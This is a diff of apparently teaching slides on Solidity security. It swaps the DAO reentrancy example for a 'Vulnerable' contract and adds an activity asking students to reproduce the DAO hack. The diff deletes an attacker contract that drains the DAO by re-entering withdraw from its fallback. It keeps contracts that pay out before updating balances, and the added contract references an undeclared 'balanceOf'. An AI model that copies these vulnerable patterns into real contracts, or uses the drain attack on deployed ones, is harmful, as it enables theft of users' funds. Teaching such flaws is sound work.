@@ -404,9 +404,23 @@ Even small logic errors or gas inefficiencies can be exploited for financial gai
 
 ---v
 
-### The famous reentrency DAO hack
+### Reentrency bug
 
 ```solidity
+contract Vulnerable {
+    mapping(address => uint256) public balances;
+
+    function withdraw() external {
+        uint256 amount = balanceOf[msg.sender];
+
+        // 🔴 Sends ETH before updating balance
+        (bool success, ) = msg.sender.call.value(amount)("");
+        require(success, "Transfer failed.");
+
+        // 🔴 Balance Update after Transfer - Allows Reentrancy!
+        balances[msg.sender] = 0;
+    }
+}
 contract Dao {
     mapping(address => uint256) public balances;
 
@@ -419,43 +433,24 @@ contract Dao {
         uint256 amount = balances[msg.sender];
         require(amount > 0, "No balance to withdraw");
 
-        // 🔴 Sends ETH before updating balance
+        // ❗Sends ETH before updating balance
         (bool success, ) = msg.sender.call{value: amount}("");
         require(success, "Transfer failed");
 
-        // 🔴 Balance Update after Transfer - Allows Reentrancy!
+        // ❗ Balance Update after Transfer - Allows Reentrancy!
         balances[msg.sender] = 0;
-    }
-}
-
-interface IDao {
-    function withdraw() external ;
-    function deposit()external  payable;
- }
-
-contract Hacker{
-    IDao dao;
-
-    constructor(address _dao){
-        dao = IDao(_dao);
-    }
-
-    function attack() public payable {
-        require(msg.value >= 1 ether, "Need at least 1 ether to commence attack.");
-        dao.deposit{value: msg.value}();
-        dao.withdraw();
-    }
-
-    fallback() external payable{
-        if(address(dao).balance >= 1 ether){
-            dao.withdraw();
-        }
     }
 }
 ```
 
 Note:
 see https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/
+
+---v
+
+### Activity: Reproduce the DAO hack
+
+> Reproduce the infamous DAO hack.
 
 ---
 
